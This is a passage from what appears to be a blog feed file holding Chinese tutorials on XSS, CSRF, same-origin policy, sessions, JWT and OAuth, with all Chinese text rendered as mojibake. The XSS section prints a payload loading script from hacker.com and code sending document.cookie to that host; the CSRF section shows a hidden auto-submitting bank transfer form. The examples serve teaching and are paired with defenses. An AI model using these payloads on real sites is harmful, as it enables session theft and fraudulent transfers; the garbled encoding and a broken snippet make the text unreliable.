çš„èº«ä»½åšäº‹æƒ…äº†ã€‚</p><p>å¦‚æœé¡µé¢è¢«æ³¨å…¥æ¶æ„jsè„šæœ¬ï¼Œå¯ä»¥åšï¼š</p><ul><li>çªƒå¬cookieï¼šé€šè¿‡<code>document.cookie</code>è·å–cookieä¿¡æ¯ï¼Œå‘é€ç»™æ¶æ„æœåŠ¡å™¨</li><li>ç›‘å¬ç”¨æˆ·è¡Œä¸ºï¼šé€šè¿‡<code>addEventListener</code>ç›‘å¬é”®ç›˜æ—¶é—´ï¼Œå‘é€ç»™æ¶æ„æœåŠ¡å™¨</li><li>ä¿®æ”¹DOMï¼šä¼ªé€ å‡çš„ç™»å½•çª—å£ï¼Œæ¬ºéª—ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </li><li>åœ¨é¡µé¢å†…ç”Ÿæˆæµ®çª—å¹¿å‘Š</li></ul><p>å°†ä¸€æ®µæ¶æ„JSä»£ç æäº¤åˆ°æ•°æ®åº“ï¼Œç”¨æˆ·è¯·æ±‚åŒ…å«æ¶æ„jsè„šæœ¬çš„æ•°æ®ï¼Œå¹¶æ³¨å…¥é¡µé¢ã€‚</p><p>æŸä¸ªé»‘å®¢å‘è¡¨äº†ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨<code>&lt;input&gt;</code>æ¡†ä¸­è¾“å…¥ä¸€æ®µscript<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>hack.jsæ–‡ä»¶ä¸­çš„å†…å®¹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><h4 id="2-2-å¦‚ä½•é˜»æ­¢æ”»å‡»"><a href="#2-2-å¦‚ä½•é˜»æ­¢æ”»å‡»" class="headerlink" title="2.2 å¦‚ä½•é˜»æ­¢æ”»å‡»"></a>2.2 å¦‚ä½•é˜»æ­¢æ”»å‡»</h4><ul><li><p>å¯¹å…³é”®å­—ç¬¦è½¬ç </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è½¬ç å‰</span></span><br><span class="line">code:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'ä½ è¢«xssæ”»å‡»äº†'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è½¬ç å</span></span><br><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39;ä½ è¢«xssæ”»å‡»äº†&amp;#39;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure></li><li><p>ç”¨<code>HttpOnly</code>ä¿æŠ¤<code>Cookie</code>çš„å®‰å…¨</p></li><li>ç¦æ­¢æ‰§è¡Œå†…è”è„šæœ¬</li><li>é™åˆ¶åŠ è½½å…¶ä»–åŸŸä¸‹çš„èµ„æº</li></ul><p><br></p><h3 id="3-CSRFè·¨ç«™è„šæœ¬ä¼ªé€ "><a href="#3-CSRFè·¨ç«™è„šæœ¬ä¼ªé€ " class="headerlink" title="3. CSRFè·¨ç«™è„šæœ¬ä¼ªé€ "></a>3. CSRFè·¨ç«™è„šæœ¬ä¼ªé€ </h3><h4 id="3-1-CSRFæ”»å‡»è¡Œä¸º"><a href="#3-1-CSRFæ”»å‡»è¡Œä¸º" class="headerlink" title="3.1 CSRFæ”»å‡»è¡Œä¸º"></a>3.1 CSRFæ”»å‡»è¡Œä¸º</h4><p>é»‘å®¢å¼•è¯±ç”¨æˆ·æ‰“å¼€é»‘å®¢çš„ç½‘ç«™ï¼Œåˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å‘èµ·è·¨ç«™è¯·æ±‚ã€‚</p><ul><li>è‡ªåŠ¨å‘èµ·GETè¯·æ±‚</li><li>è‡ªåŠ¨å‘èµ·POSTè¯·æ±‚</li><li>å¼•è¯±ç”¨æˆ·ç‚¹å‡»é“¾æ¥</li></ul><p>å‡è®¾æœ‰ä¸ªé“¶è¡Œç½‘ç«™ç”¨ä»¥ä¸‹æ–¹å¼è¿›è¡Œè½¬è´¦æ“ä½œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bank.com/transfer.php?toBankId=&lt;è´¦å·&gt;&amp;money=&lt;é‡‘é¢&gt;</span><br></pre></td></tr></table></figure></p><p>ä½ æ‰“å¼€æµè§ˆå™¨ï¼Œå…ˆç™»å½•äº†é“¶è¡Œç½‘ç«™ï¼Œç„¶ååˆå¼€äº†ä¸€ä¸ªtabé¡µï¼Œæ‰“å¼€äº†ä½ çš„é‚®ç®±ï¼Œæœ‰è¿™ä¹ˆä¸€ä¸ªé‚®ä»¶ï¼šæ­å–œä½ è·å¾—äº†ä¸€å°iphone x,ç‚¹å‡»é¢†å–ã€‚ç‚¹å‡»äº†ä¸Šé¢çš„é“¾æ¥ï¼Œå°±æ‰§è¡Œäº†è½¬è´¦æ“ä½œã€‚</p><p>åæ¥é“¶è¡Œè½¬è´¦åŠŸèƒ½ä¸ç”¨<code>get</code>ï¼Œ æ”¹ç”¨<code>post</code>ã€‚ </p><p>é»‘å®¢ä¹Ÿåšäº†æ”¹è¿›ï¼Œå»ºç«‹äº†ä¸€ä¸ªå·å·æäº¤æ•°æ®çš„é¡µé¢ã€‚ç”¨æˆ·è¿›å…¥è¯¥é¡µé¢ï¼Œä¼šè‡ªåŠ¨æäº¤è¡¨å•ã€‚è‹¥ç”¨æˆ·å·²ç»ç™»å½•äº†<code>www.bank.com</code>ï¼Œè¯·æ±‚æˆåŠŸã€‚</p><p>ä»å¤´åˆ°å°¾ï¼Œæ”»å‡»ç½‘ç«™éƒ½æ²¡æœ‰è·å–åˆ°è¿‡cookieï¼Œ éƒ½æ˜¯é€šè¿‡æµè§ˆå™¨é—´æ¥å®ç°ï¼ˆåˆ©ç”¨webçš„cookieéšå¼èº«ä»½éªŒè¯æœºåˆ¶ï¼‰ï¼Œæ‰€ä»¥<code>httpOnly</code>å¹¶ä¸ä¼šå½±å“è¿™ä¸ªæ”»å‡»ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display:</span>'<span class="attr">none</span>'&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://www.bank.com/transfer.php"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="javascript">      iframe.document.submit(<span class="string">"transfer"</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-é˜²æ­¢CSRFæ”»å‡»"><a href="#3-2-é˜²æ­¢CSRFæ”»å‡»" class="headerlink" title="3.2 é˜²æ­¢CSRFæ”»å‡»"></a>3.2 é˜²æ­¢CSRFæ”»å‡»</h4><ul><li>å¦‚æœæ˜¯ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘èµ·çš„è¯·æ±‚ï¼Œç¦æ­¢å‘é€æŸäº›å…³é”®Cookieæ•°æ®åˆ°æœåŠ¡å™¨<br><code>Set-cookie</code>è¯·æ±‚å¤´å¸¦ä¸Š<code>SameSite</code>: Strict, Lax, None</li><li>æ£€æŸ¥Referer, Originè¯·æ±‚å¤´: æ ¹æ®åœ°å€åˆ¤æ–­æ˜¯å¦æ¥å—è¯·æ±‚</li><li>CSRF Token: åœ¨æµè§ˆå™¨å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª CSRF Tokenï¼Œè¯¥å­—ç¬¦ä¸²æ¤å…¥åˆ°è¿”å›çš„é¡µé¢ä¸­ã€‚å¦‚æœè¦å‘èµ·è½¬è´¦ï¼Œå°±è¦å¸¦ä¸ŠCSRF Token</li></ul><p><br></p><h3 id="4-åŒæºç­–ç•¥"><a href="#4-åŒæºç­–ç•¥" class="headerlink" title="4. åŒæºç­–ç•¥"></a>4. åŒæºç­–ç•¥</h3><p>å¦‚æœä¸¤ä¸ª URL çš„åè®®ã€åŸŸåå’Œç«¯å£éƒ½ç›¸åŒï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸¤ä¸ª URL åŒæºã€‚</p><ul><li>DOMå±‚é¢<br>é™åˆ¶äº†æ¥è‡ªä¸åŒæºçš„ JavaScript è„šæœ¬å¯¹å½“å‰ DOM å¯¹è±¡è¯»å’Œå†™çš„æ“ä½œã€‚</li><li>æ•°æ®å±‚é¢<br>é™åˆ¶äº†ä¸åŒæºçš„ç«™ç‚¹è¯»å–å½“å‰ç«™ç‚¹çš„ Cookieã€IndexDBã€LocalStorage ç­‰æ•°æ®ã€‚</li><li>ç½‘ç»œå±‚é¢<br>é™åˆ¶äº†é€šè¿‡ XMLHttpRequest ç­‰æ–¹å¼å°†ç«™ç‚¹çš„æ•°æ®å‘é€ç»™ä¸åŒæºçš„ç«™ç‚¹ã€‚</li></ul><p>ä½†åŒæ—¶ï¼š</p><ul><li>é¡µé¢ä¸­å¯ä»¥åµŒå…¥ç¬¬ä¸‰æ–¹èµ„æº</li><li>CSP &amp; CORS: è®©æœåŠ¡å™¨å†³å®šæµè§ˆå™¨èƒ½å¤ŸåŠ è½½å“ªäº›èµ„æºï¼Œè®©æœåŠ¡å™¨å†³å®šæµè§ˆå™¨æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œå†…è” JavaScript ä»£ç ã€‚</li></ul><p><br></p><h3 id="5-https"><a href="#5-https" class="headerlink" title="5. https"></a>5. https</h3><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://cloud.tencent.com/developer/article/1004895" target="_blank" rel="noopener">ç®€å•çš„ web å®‰å…¨ checklist</a></li><li>ç å†œç¿»èº«-webå®‰å…¨</li><li>ã€Šå›¾è§£HTTPã€‹ç¬¬11ç«  Webçš„æ”»å‡»æŠ€æœ¯</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Session, tokenä¸OAuth</title>
      <link href="/2019/02/16/%E4%BB%8Esession%E5%88%B0token/"/>
      <url>/2019/02/16/%E4%BB%8Esession%E5%88%B0token/</url>
      <content type="html"><![CDATA[<h3 id="1-Webç™»å½•çš„æœ¬è´¨"><a href="#1-Webç™»å½•çš„æœ¬è´¨" class="headerlink" title="1. Webç™»å½•çš„æœ¬è´¨"></a>1. Webç™»å½•çš„æœ¬è´¨</h3><p>ç”±äº<strong>HTTPæ˜¯æ— çŠ¶æ€åè®®</strong>ï¼Œæ‰€ä»¥æœåŠ¡ç«¯éœ€è¦è®°å½•ç”¨æˆ·çŠ¶æ€æ—¶ï¼Œå°±éœ€è¦æŸç§æœºåˆ¶æ¥è¯†åˆ«å…·ä½“çš„ç”¨æˆ·ï¼Œè¿™ä¸ªæœºåˆ¶å°±æ˜¯<em><code>Session</code></em>ã€‚</p><p><br></p><h3 id="2-cookieå’ŒSession"><a href="#2-cookieå’ŒSession" class="headerlink" title="2. cookieå’ŒSession"></a>2. cookieå’ŒSession</h3><p>å¸¸ç”¨çš„ä¼šè¯è·Ÿè¸ªæŠ€æœ¯æ˜¯cookieå’Œsession<br>cookieæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œsessionæ˜¯å­˜å‚¨åœ¨serverç«¯<br>å¯ä»¥è¯´ï¼Œcookieæ˜¯ä¸€ç§è¡¥è¶³httpåè®®æ— çŠ¶æ€çš„æœºåˆ¶</p><p>ä¸€ä¸ªcookieçš„è®¾ç½®åˆ†ä¸º4æ­¥</p><ul><li>å®¢æˆ·ç«¯å‘é€httpè¯·æ±‚</li><li>æœåŠ¡å™¨å“åº”httpè¯·æ±‚ set-cookies response</li><li>å®¢æˆ·ç«¯å‘é€httpè¯·æ±‚ åŒ…å«cookieå¤´éƒ¨ å‘é€åˆ°æœåŠ¡å™¨ç«¯</li><li>æœåŠ¡å™¨è¿”å›ä¸€ä¸ªhttp response</li></ul><p><br><br><img src="/2019/02/16/ä»sessionåˆ°token/1.png" style="max-width: 500px"></p><p>session æ˜¯ç”¨æœåŠ¡å™¨æ¥ä¿æŒçŠ¶æ€çš„ã€‚ä¸“é—¨ä¸ºç”¨æˆ·å¼€è¾Ÿå­˜å‚¨ç©ºé—´ï¼Œsessionè¢«åˆ›å»ºåä¼šä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå…¶ä¸­session IDåˆ™å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯ä¸‹æ¬¡å‘é€è¯·æ±‚æºå¸¦session IDï¼ŒæœåŠ¡å™¨åˆ™ä¼šæŸ¥è¯¢è¯¥ID æ‰¾åˆ°å¯¹åº”çš„sessionè¯»å–ä¿¡æ¯ã€‚</p><p>åœ¨ä½¿ç”¨sessionæœºåˆ¶ä¿æŒæŒä¹…åŒ–ç™»é™†çš„å®ç°ä¸Šå¯ä»¥å°†sessionIDä¿å­˜åœ¨ cookieã€headerã€URLä¸­ï¼Œå®¢æˆ·ç«¯å¸¦ç€sessionIDè¿‡æ¥ï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™ä¸ªsessionIDåˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰ä¼šè¯ã€‚</p><p>æ‰€ä»¥ï¼Œ <em><code>Session</code></em>æ˜¯åœ¨æœåŠ¡ç«¯ä¿å­˜çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œç”¨æ¥è·Ÿè¸ªç”¨æˆ·çš„çŠ¶æ€ï¼Œè¿™ä¸ªæ•°æ®å¯ä»¥ä¿å­˜åœ¨é›†ç¾¤ã€æ•°æ®åº“ã€æ–‡ä»¶ä¸­ã€‚<br><em><code>Cookie</code></em>æ˜¯å®¢æˆ·ç«¯ä¿å­˜ç”¨æˆ·ä¿¡æ¯çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨æ¥è®°å½•ç”¨æˆ·çš„ä¸€äº›ä¿¡æ¯ï¼Œä¹Ÿæ˜¯å®ç°Sessionçš„å…¶ä¸­ä¸€ç¯ã€‚</p><p><br></p><h3 id="3-ä»Sessionåˆ°token"><a href="#3-ä»Sessionåˆ°token" class="headerlink" title="3. ä»Sessionåˆ°token"></a>3. ä»Sessionåˆ°token</h3><p>Sessionçš„é—®é¢˜åœ¨äºï¼Œæ‰©å±•æ€§ä¸å¥½ã€‚å¦‚æœæ˜¯æœåŠ¡å™¨é›†ç¾¤ï¼Œæˆ–è·¨åŸŸçš„æœåŠ¡å¯¼å‘æ¶æ„ï¼Œå°±è¦æ±‚sessionæ•°æ®å…±äº«ï¼Œå•ç‚¹ç™»å½•ã€‚æœåŠ¡å™¨éœ€è¦ä¿å­˜å¹¶ç®¡ç†æ‰€æœ‰äººçš„session id, è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„å¼€é”€ã€‚<em>å¯ä»¥ä¸ä¿å­˜è¿™äº›Session IDå—ï¼Ÿ</em></p><p>æ¯”å¦‚ï¼Œå¯¹æ•°æ®åšä¸€ä¸ªç­¾åã€‚ç”¨HMAC-SHA256ç®—æ³•ï¼ŒåŠ ä¸Šä¸€ä¸ªåªæœ‰æˆ‘çŸ¥é“çš„å¯†é’¥ï¼Œå¯¹æ•°æ®åšä¸€ä¸ªç­¾åï¼Œ<strong>æŠŠè¿™ä¸ªæ•°æ®å’Œç­¾åä¸€èµ·ä½œä¸º<code>token</code></strong>ï¼Œç”±äºå¯†é’¥åˆ«äººä¸çŸ¥é“ï¼Œå°±æ— æ³•ä¼ªé€ tokenäº†ã€‚<br><br><br><img src="/2019/02/16/ä»sessionåˆ°token/2.png" style="max-width: 300px"><br><br><br>è¿™ä¸ªtokenæœåŠ¡å™¨ä¸ä¿å­˜ï¼Œåªæœ‰å°FæŠŠtokenå‘è¿‡æ¥çš„æ—¶å€™ï¼Œå†ç”¨åŒæ ·çš„HMAC-SHA256ç®—æ³•å’ŒåŒæ ·çš„å¯†é’¥ï¼Œå¯¹æ•°æ®å†è®¡ç®—ä¸€æ¬¡ç­¾åï¼Œå’Œtokenä¸­çš„ç­¾ååšæ¯”è¾ƒ.å¦‚æœç›¸åŒï¼Œæˆ‘ä»¬å°±çŸ¥é“å°Få·²ç»ç™»å½•è¿‡äº†ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥å»åˆ°å°Fçš„user idã€‚å¦‚æœä¸ç›¸åŒï¼Œæ•°æ®éƒ¨åˆ†è‚¯å®šè¢«äººç¯¡æ”¹è¿‡ï¼Œå°±å¯ä»¥å‘Šè¯‰å‘é€è€…: å¯¹ä¸èµ·ï¼Œæ²¡æœ‰è®¤è¯ã€‚</p><p>è¿™æ ·ä¸€æ¥ï¼ŒæœåŠ¡å™¨å°±ä¸ä¿å­˜session idäº†ï¼Œå®ƒåªæ˜¯ç”Ÿæˆtoken, éªŒè¯tokenï¼Œç”¨CPUçš„è®¡ç®—æ—¶é—´æ¢å–äº†sessionçš„å­˜å‚¨ç©ºé—´ã€‚</p><p><br></p><h3 id="3-JWT"><a href="#3-JWT" class="headerlink" title="3. JWT"></a>3. JWT</h3><p><code>JWT(JSON Web Token)</code>æ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨åŸŸè®¤è¯è§£å†³æ–¹æ¡ˆã€‚<br><img src="/2019/02/16/ä»sessionåˆ°token/3.png"></p><p>JWTå¤§è‡´é•¿è¿™æ ·ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨<code>.</code>åˆ†éš”æˆä¸‰éƒ¨åˆ†ã€‚JWTä¸ä»…ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯ä»¥ç”¨äºäº¤æ¢ä¿¡æ¯ã€‚æœ‰æ•ˆä½¿ç”¨JWTï¼Œå¯ä»¥é™ä½æœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“çš„æ¬¡æ•°ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header(å¤´éƒ¨).Payload(è´Ÿè½½).Signature(ç­¾å)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-1-Header"><a href="#3-1-Header" class="headerlink" title="3.1 Header"></a>3.1 <em><code>Header</code></em></h4><p>Headeræè¿°JWTçš„å…ƒæ•°æ®, <code>alg</code>è¡¨ç¤ºç­¾åçš„ç®—æ³•ï¼Œé»˜è®¤æ˜¯HMAC SHA156ã€‚ <code>typ</code>è¡¨ç¤ºè¿™ä¸ªtokençš„ç±»å‹ï¼Œç»Ÿä¸€å†™ä¸º<code>JWT</code>ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-Payload"><a href="#3-2-Payload" class="headerlink" title="3.2 Payload"></a>3.2 <em><code>Payload</code></em></h4><p>Payloadç”¨äºå­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®ã€‚JWtTè§„å®šäº†7ä¸ªå®˜æ–¹å­—æ®µã€‚é™¤äº†å®˜æ–¹å­—æ®µï¼Œä½ è¿˜å¯ä»¥å®šä¹‰ç§æœ‰å­—æ®µï¼ŒJWTé»˜è®¤æ˜¯ä¸åŠ å¯†çš„ï¼Œæ‰€ä»¥ä¸è¦æŠŠç§˜å¯†ä¿¡æ¯æ”¾åœ¨è¿™é‡Œã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss (issuer)ï¼šç­¾å‘äºº</span><br><span class="line">exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´</span><br><span class="line">sub (subject)ï¼šä¸»é¢˜</span><br><span class="line">aud (audience)ï¼šå—ä¼—</span><br><span class="line">nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´</span><br><span class="line">iat (Issued At)ï¼šç­¾å‘æ—¶é—´</span><br><span class="line">jti (JWT ID)ï¼šç¼–å·</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-Signature"><a href="#3-3-Signature" class="headerlink" title="3.3 Signature"></a>3.3 <em><code>Signature</code></em></h4><p>Signatureæ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åã€‚</p><p><br></p><h3 id="4-OAuth"><a href="#4-OAuth" class="headerlink" title="4. OAuth"></a>4. OAuth</h3><p><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">OAuth</a> æ˜¯ä¸€ä¸ªå…³äºæˆæƒ(authorization)çš„å¼€æ”¾ç½‘ç»œæ ‡å‡†ã€‚OAuthåœ¨â€œå®¢æˆ·ç«¯â€ä¸â€œæœåŠ¡æä¾›å•†â€ä¹‹é—´ï¼Œè®¾ç½®äº†ä¸€ä¸ªæˆæƒå±‚ã€‚â€œå®¢æˆ·ç«¯â€ç™»å½•æˆæƒå±‚ä»¥åï¼Œè·å–tokenï¼Œâ€œæœåŠ¡æä¾›å•†â€æ ¹æ®tokençš„æƒé™èŒƒå›´å’Œæœ‰æ•ˆæœŸï¼Œå‘â€œå®¢æˆ·ç«¯â€å¼€æ”¾ç”¨æˆ·å‚¨å­˜çš„èµ„æ–™ã€‚OAuthæœ‰ä»¥ä¸‹å‡ ç§å¸¸ç”¨æ¨¡å¼ï¼š<br><br></p><h4 id="4-1-Resource-Owner-Password-Credentials-Grant-èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®è®¤å¯"><a href="#4-1-Resource-Owner-Password-Credentials-Grant-èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®è®¤å¯" class="headerlink" title="4.1 Resource Owner Password Credentials Grant(èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®è®¤å¯)"></a>4.1 Resource Owner Password Credentials Grant(èµ„æºæ‰€æœ‰è€…å¯†ç å‡­æ®è®¤å¯)</h4><p>å°Aç›´æ¥æä¾›ç”¨æˆ·åå’Œå¯†ç ï¼Œè®©â€ä¿¡ç”¨å¡ç®¡å®¶â€å‘â€œç½‘æ˜“è®¤è¯ä¸­å¿ƒâ€è¯·æ±‚tokenã€‚<br><br></p><h4 id="4-2-Implicit-Grant-éšå¼è®¸å¯"><a href="#4-2-Implicit-Grant-éšå¼è®¸å¯" class="headerlink" title="4.2 Implicit Grant(éšå¼è®¸å¯)"></a>4.2 Implicit Grant(éšå¼è®¸å¯)</h4><p>å°Aç”¨ç½‘æ˜“è´¦å·ç™»å½•ï¼Œç¡®è®¤æˆæƒåï¼Œä¼šé‡å®šå‘åˆ°â€œä¿¡ç”¨å¡ç®¡å®¶â€ç½‘ç«™ï¼ŒåŒæ—¶æå¸¦ä¸€ä¸ª<code>token</code>ã€‚ä¿¡ç”¨å¡ç®¡å®¶å°±å¯ä»¥ç”¨è¿™ä¸ªtokenï¼Œæ¥è®¿é—®ç½‘æ˜“å¼€æ”¾çš„èµ„æºã€‚<br><br><br><img src="/2019/02/16/ä»sessionåˆ°token/4.png"><br><br></p><h4 id="4-3-Authorization-Code-Grant-æˆæƒç è®¸å¯"><a href="#4-3-Authorization-Code-Grant-æˆæƒç è®¸å¯" class="headerlink" title="4.3 Authorization Code Grant(æˆæƒç è®¸å¯)"></a>4.3 Authorization Code Grant(æˆæƒç è®¸å¯)</h4><p>å°Aç”¨ç½‘æ˜“è´¦å·ç™»å½•çš„æ—¶å€™ï¼Œç½‘æ˜“è®¤è¯ä¸­å¿ƒä¸ç›´æ¥å‘tokenï¼Œè€Œæ˜¯å‘ä¸€ä¸ªæˆæƒç <code>(authorization code)</code>ã€‚å½“â€œä¿¡ç”¨å¡ç®¡ç†ä¸­å¿ƒâ€å–åˆ°è¿™ä¸ªcodeä»¥åï¼Œåœ¨åå°å†æ¬¡è®¿é—®ç½‘æ˜“è®¤è¯ä¸­å¿ƒï¼Œè¿™ä¸€æ¬¡æ‰æ‹¿åˆ°äº†çœŸæ­£çš„tokenã€‚</p><p>æˆæƒç æ¨¡å¼æ˜¯åŠŸèƒ½æœ€å®Œæ•´ï¼Œæµç¨‹æœ€ä¸¥å¯†çš„æˆæƒæ¨¡å¼ã€‚<br><br><br><img src="/2019/02/16/ä»sessionåˆ°token/5.png"></p><h4 id="4-4-è§£æjwt"><a href="#4-4-è§£æjwt" class="headerlink" title="4.4 è§£æjwt"></a>4.4 è§£æjwt</h4><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513566&amp;idx=1&amp;sn=a2688cadbe9c8042ff1abbdf04a8bd5e&amp;chksm=80d67a1db7a1f30b28b93ed2ab29edfbf982b780433e4bfd178e3cc52cb1f9100cc8f923db4f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">å¹²æ‰çŠ¶æ€: ä»sessionåˆ°token</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513744&amp;idx=1&amp;sn=93d0db97cfd67422bcd21c8afd00f495&amp;chksm=80d67b53b7a1f24537fdc7c10eb2783357c1f8c65ad55601a722216d2293ae3fb7b1c16e5449&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">ä»å¯†ç åˆ°token</a></li><li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener">Cookieå’ŒSessionæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></li><li><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">The OAuth 2.0 Authorization Framework</a></li><li><a href="https://www.xiaolai.cc/2019/04/23/cookie/" target="_blank" rel="noopener">cookieä¸sessionå®ç°æŒä¹…åŒ–ç™»é™†</a></li><li><a href="https://juejin.im/post/5b7ea1366fb9a01a0b319612" target="_blank" rel="noopener">å‰åç«¯åˆ†ç¦»ä½¿ç”¨ Token ç™»å½•è§£å†³æ–¹æ¡ˆ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Object.definePropertyå’Œproxyå®ç°å“åº”å¼</title>
      <link href="/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/</url>
